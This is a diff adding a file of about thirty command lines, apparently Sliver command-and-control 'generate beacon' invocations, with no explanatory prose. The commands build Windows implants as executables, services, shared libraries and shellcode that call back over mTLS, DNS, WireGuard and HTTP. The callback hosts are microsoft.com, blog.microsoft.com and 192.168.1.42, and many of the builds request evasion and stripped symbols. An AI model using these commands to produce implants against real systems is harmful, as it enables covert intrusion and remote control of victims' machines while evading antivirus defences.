@@ -1,0 +1,32 @@
+#  MTLS 
+
+generate beacon --mtls microsoft.com --os windows --arch 386 -f exe -s beacon_mtls__386.exe
+generate beacon --mtls microsoft.com --os windows --arch amd64 -f exe -s beacon_mtls__amd64.exe
+generate beacon --mtls microsoft.com --os windows --arch amd64 -f service -s beacon_mtls__amd64.service
+generate beacon --mtls microsoft.com --os windows --arch amd64 -f shared -s beacon_mtls__amd64.shared
+generate beacon --mtls microsoft.com -e --os windows --arch 386 -f exe -s beacon_mtls__evasion_386.exe
+generate beacon --mtls microsoft.com -e --os windows --arch 386 -f shellcode -s beacon_mtls__evasion_386.shellcode
+generate beacon --mtls microsoft.com -e --os windows --arch amd64 -f shellcode -s beacon_mtls__evasion_amd64.shellcode
+generate beacon --mtls microsoft.com -e --os windows --arch amd64 -f shared -s beacon_mtls__evasion_amd64.shared
+generate beacon --mtls microsoft.com --skip-symbols --os windows --arch 386 -f shellcode -s beacon_mtls__skip_386.shellcode
+generate beacon --mtls microsoft.com --skip-symbols --os windows --arch amd64 -f exe -s beacon_mtls__skip_amd64.exe
+generate beacon --mtls microsoft.com --skip-symbols --os windows --arch amd64 -f shared -s beacon_mtls__skip_amd64.shared
+generate beacon --mtls microsoft.com --skip-symbols -e --os windows --arch 386 -f service -s beacon_mtls__skip_evasion_386.service
+generate beacon --mtls microsoft.com --skip-symbols -e --os windows --arch amd64 -f shellcode -s beacon_mtls__skip_evasion_amd64.shellcode
+generate beacon --mtls microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s beacon_mtls__skip_evasion_amd64.shared
+generate beacon --mtls microsoft.com --dns blog.microsoft.com --os windows --arch 386 -f exe -s beacon_mtls_dns__386.exe
+generate beacon --mtls microsoft.com --dns blog.microsoft.com --os windows --arch 386 -f shared -s beacon_mtls_dns__386.shared
+generate beacon --mtls microsoft.com --dns blog.microsoft.com -e --os windows --arch 386 -f exe -s beacon_mtls_dns__evasion_386.exe
+generate beacon --mtls microsoft.com --dns blog.microsoft.com -e --os windows --arch amd64 -f shellcode -s beacon_mtls_dns__evasion_amd64.shellcode
+generate beacon --mtls microsoft.com --dns blog.microsoft.com -e --os windows --arch amd64 -f shared -s beacon_mtls_dns__evasion_amd64.shared
+generate beacon --mtls microsoft.com --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f service -s beacon_mtls_dns__skip_amd64.service
+generate beacon --mtls microsoft.com --dns blog.microsoft.com --skip-symbols -e --os windows --arch 386 -f shellcode -s beacon_mtls_dns__skip_evasion_386.shellcode
+generate beacon --mtls microsoft.com --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s beacon_mtls_dns__skip_evasion_amd64.shared
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f shared -s beacon_mtls_wg_http_dns__skip_evasion_amd64.shared
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols -e --os windows --arch amd64 -f service -s beacon_mtls_wg_http_dns__skip_evasion_amd64.service
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f shared -s beacon_mtls_wg_http_dns__skip_amd64.shared
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com --skip-symbols --os windows --arch amd64 -f service -s beacon_mtls_wg_http_dns__skip_amd64.service
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --dns blog.microsoft.com -e --os windows --arch amd64 -f shared -s beacon_mtls_wg_http_dns__evasion_amd64.shared
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols -e --os windows --arch amd64 -f shared -s beacon_mtls_wg_http__skip_evasion_amd64.shared
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 --skip-symbols --os windows --arch 386 -f exe -s beacon_mtls_wg_http__skip_386.exe
+generate beacon --mtls microsoft.com --wg 192.168.1.42 --http 192.168.1.42 -e --os windows --arch 386 -f shellcode -s beacon_mtls_wg_http__evasion_386.shellcode
